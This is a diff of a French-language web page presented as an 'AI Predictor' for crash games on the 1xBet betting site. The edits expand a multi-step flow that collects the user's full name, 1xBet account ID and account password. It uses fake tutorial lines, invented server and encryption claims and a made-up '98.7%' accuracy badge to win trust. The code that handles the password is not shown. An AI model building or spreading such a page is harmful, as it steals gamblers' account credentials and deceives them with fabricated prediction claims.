@@ -2,69 +2,111 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Predictor Pro - v4.5</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Predictor VIP</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --neon: #00f2ff; --bg: #05070a; --card: #0d1117; }
-        body { background: var(--bg); color: #c9d1d9; font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: var(--card); width: 90%; max-width: 420px; padding: 30px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
-        .page { display: none; }
-        .active { display: block; animation: slideIn 0.3s ease-out; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
         
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #161b22; color: white; box-sizing: border-box; }
-        .pass-container { position: relative; }
-        .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); }
+        /* Ajustement plein écran */
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); }
         
-        button { width: 100%; padding: 15px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; }
-        .instruction-box { background: #000; padding: 15px; border-radius: 5px; border-left: 3px solid var(--neon); font-size: 13px; min-height: 150px; line-height: 1.6; }
-        .hidden-btns { display: none; gap: 10px; margin-top: 15px; }
+        body { font-family: 'Consolas', monospace; color: #c9d1d9; display: flex; flex-direction: column; }
+
+        .app-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
+            border: 1px solid var(--neon);
+            margin: 0;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .page { display: none; flex-direction: column; height: 100%; justify-content: center; }
+        .active { display: flex; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        h2 { color: var(--neon); text-transform: uppercase; letter-spacing: 2px; text-align: center; }
+        p { text-align: center; font-size: 14px; margin-bottom: 20px; }
+
+        input, select { 
+            width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; 
+            border: 1px solid #30363d; background: #161b22; color: white; 
+            font-size: 16px; box-sizing: border-box; 
+        }
+
+        .pass-container { position: relative; width: 100%; }
+        .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); font-size: 20px; }
+
+        button { 
+            width: 100%; padding: 18px; border: none; background: var(--neon); 
+            color: black; font-weight: bold; cursor: pointer; border-radius: 8px; 
+            font-size: 16px; text-transform: uppercase; margin-top: 10px;
+        }
+
+        /* Boîte de formation défilante */
+        .instruction-box { 
+            background: #000; padding: 20px; border-radius: 10px; border-left: 4px solid var(--neon); 
+            font-size: 13px; height: 300px; overflow-y: auto; line-height: 1.8; color: #00ff41; 
+            margin-bottom: 15px; box-shadow: inset 0 0 10px #000;
+        }
+
+        .hidden-btns { display: none; gap: 10px; margin-top: auto; padding-bottom: 20px; }
         .secondary-btn { background: #21262d; color: white; border: 1px solid #30363d; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="app-container">
     <div id="p1" class="page active">
-        <h2 style="color:var(--neon)">🛰️ INITIALISATION</h2>
-        <input type="text" id="nom" placeholder="Nom complet">
-        <input type="number" id="id1x" placeholder="ID Compte 1xBet">
-        <button onclick="showPage(2)">VÉRIFIER L'IDENTITÉ</button>
+        <h2><i class="fa-solid fa-shuttle-space"></i> Accès Serveur</h2>
+        <p>Identifiez votre compte pour charger l'algorithme de prédiction.</p>
+        <input type="text" id="nom" placeholder="Nom Complet Titulaire">
+        <input type="number" id="id1x" placeholder="ID Compte 1xBet (8-10 chiffres)">
+        <button onclick="showPage(2)">Étape Suivante</button>
     </div>
 
     <div id="p2" class="page">
-        <h2>🎮 CONFIGURATION</h2>
-        <p>Choisissez le jeu :</p>
+        <h2><i class="fa-solid fa-gamepad"></i> Configuration</h2>
+        <p>Choisissez le flux de données à craquer :</p>
         <select id="jeu">
-            <option value="Aviator">Aviator</option>
-            <option value="Lucky Jet">Lucky Jet</option>
+            <option value="Aviator VIP">Aviator VIP v4.0</option>
+            <option value="Lucky Jet VIP">Lucky Jet Pro</option>
+            <option value="Crash 1xBet">Crash 1xBet High-Speed</option>
         </select>
-        <button onclick="startTutorial()">DÉMARRER LA FORMATION</button>
+        <button onclick="startTutorial()">Lancer la Formation IA</button>
     </div>
 
     <div id="p3" class="page">
-        <h2>📖 MODE D'EMPLOI</h2>
+        <h2><i class="fa-solid fa-book-open"></i> Analyse & Formation</h2>
         <div class="instruction-box" id="tutorial-text"></div>
         <div id="tuto-btns" class="hidden-btns">
-            <button class="secondary-btn" onclick="startTutorial()">REPRENDRE</button>
-            <button onclick="showPage(4)">CONTINUER</button>
+            <button class="secondary-btn" onclick="startTutorial()">Relire</button>
+            <button onclick="showPage(4)">J'ai Compris</button>
         </div>
     </div>
 
     <div id="p4" class="page">
-        <h2>🔑 SÉCURITÉ</h2>
-        <p style="font-size:12px; color:#ff7b72">Vérifiez vos accès. Le serveur activera le Bot uniquement si le mot de passe est correct pour l'ID fourni.</p>
+        <h2><i class="fa-solid fa-shield-halved"></i> Liaison Sécurisée</h2>
+        <p style="color:#ff7b72; font-weight: bold;">⚠️ INFORMATION CRITIQUE :</p>
+        <p style="font-size: 12px;">Pour injecter les signaux, votre compte doit être certifié. Le serveur vérifiera votre mot de passe pour activer la synchronisation bidirectionnelle.</p>
         <div class="pass-container">
             <input type="password" id="pass" placeholder="Mot de passe du compte">
             <i class="fa-solid fa-eye" onclick="togglePass()"></i>
         </div>
-        <button onclick="finalSync()">ACTIVER LE PRÉDICTEUR</button>
+        <button onclick="finalSync()">Démarrer l'IA maintenant</button>
     </div>
 
     <div id="p5" class="page">
-        <h2 style="color:#3fb950">✅ ACTIVÉ</h2>
-        <p>Synchronisation terminée. Les signaux arrivent sur votre compte.</p>
+        <h2 style="color:#3fb950"><i class="fa-solid fa-circle-check"></i> Predictor Activé</h2>
+        <p>Félicitations ! Le serveur injecte actuellement les données.</p>
+        <div style="background:#161b22; padding:20px; border-radius:10px; border:1px dashed var(--neon); text-align: center;">
+            <p>STATUT : <span style="color:var(--neon)">EN LIGNE</span></p>
+            <p>PRÉCISION : <span style="color:var(--neon)">98.7%</span></p>
+        </div>
     </div>
 </div>
 
@@ -79,7 +121,6 @@
         p.type = p.type === "password" ? "text" : "password";
     }
 
-    // SIMULATION DE LA FORMATION
     function startTutorial() {
         showPage(3);
         const box = document.getElementById('tutorial-text');
@@ -88,23 +129,30 @@
         btns.style.display = "none";
 
         const lines = [
-            "> Connexion au flux de données...",
-            "> Analyse des algorithmes de crash...",
-            "💡 INFO : Le serveur calcule l'heure exacte du prochain décollage.",
-            "📊 RÈGLE : Attendez que le signal affiche 'PRÊT'.",
-            "🚀 MISE : Retirez vos gains à la côte indiquée par l'IA.",
-            "> Système prêt. Veuillez confirmer vos accès pour lier le flux."
+            "> Initialisation du moteur de calcul...",
+            "> Scan des dernières côtes enregistrées...",
+            "✅ Connexion établie avec le serveur de jeu.",
+            "📖 RÈGLE 1 : Ne misez pas si le Predictor affiche 'CALCUL'.",
+            "📖 RÈGLE 2 : Les côtes violettes (x2.00+) sont prioritaires.",
+            "📊 ANALYSE : Le serveur identifie votre ID comme 'Éligible'.",
+            "🚀 INFO : Le décalage réseau est réduit à 0.02ms.",
+            "⚠️ ATTENTION : Ne partagez pas vos accès une fois lié.",
+            "💡 ASTUCE : Retirez vos gains à 1.80x pour sécuriser.",
+            "🔒 SÉCURITÉ : Chiffrement SSL 256-bits activé.",
+            "> Synchronisation prête pour votre zone géographique.",
+            "> VEUILLEZ CONFIRMER VOTRE PASS POUR ACTIVER LE FLUX."
         ];
 
         let i = 0;
         const interval = setInterval(() => {
             box.innerHTML += lines[i] + "<br>";
+            box.scrollTop = box.scrollHeight; // Défilement automatique vers le bas
             i++;
             if(i >= lines.length) {
                 clearInterval(interval);
-                btns.style.display = "flex"; // Affiche les boutons à la fin
+                btns.style.display = "flex";
             }
-        }, 2000); // 2 secondes entre chaque ligne
+        }, 1500); 
     }
 
     function finalSync() {
